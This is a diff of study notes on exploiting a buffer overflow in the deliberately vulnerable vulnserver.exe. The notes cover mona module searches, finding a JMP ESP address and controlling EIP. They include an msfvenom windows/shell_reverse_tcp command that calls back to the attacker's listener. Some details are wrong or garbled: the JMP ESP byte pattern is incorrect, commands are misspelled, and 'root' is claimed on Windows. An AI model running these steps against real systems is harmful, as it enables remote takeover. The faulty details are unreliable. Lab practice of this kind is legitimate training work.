@@ -65,4 +65,64 @@ write down the numbers
 finding the right module
 ==============================================================
 
-Looking for a dll inside a program without protection. Tool: Monamodules corelan github.
+Looking for a dll inside a program without protection. Tool: Monamodules corelan via github.
+
+Place in immunity debugger pycommands folder (windows)
+
+In immunity debugger, type in bottom bar "!monamodules"
+
+Displays information about what exploits are available, look for "all falses"
+
+Put all false vulnerability/ies in back of mind.
+
+In Kali Terminal type:
+
+> locate nasn_shell
+
+> /usr/share/metasploit-framework/tools/exploit/nasm-shell.rb
+
+> JMP ESP
+
+In immunity debugger type:
+
+!mona find -s "\xff\xc4" -m essfunc.dll 
+# essfunc.dll is vulnerability that is "all falses"
+
+Refer to return address in results
+
+> exit
+# from nasm shell
+
+refer to finding_the_right_module.py
+
+it's the pointer displayed in immunity debugger
+
+Overflow buffer except ESP
+
+> click on expression to follow
+
+> Enter pointer from earlier
+
+> Hit F2
+(Set a breakpoint)
+
+Now we have full manipulation of EIP and it displays the pointer from earlier (displayed in python script of topic)
+
+=========================================================================
+Generating shellcode and getting root
+=========================================================================
+msfvenom -p windows/shell_reverse_tcp LHOST=<ip of atking machine> LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
+
+Wait for shell code, then copy and paste. Disregard semi-colon at the end.
+
+Payload size means a lot, refer to that too.
+
+refer to python script
+
+run script, set up netcat listening session. Essentially a giant complex reverse shell.
+
+Make sure vulnserver.exe is running.
+
+Achieved access as root to vulnerable windows vulnserver.
+
+There can also be memory protections, this method is not how all buffer overflows work.
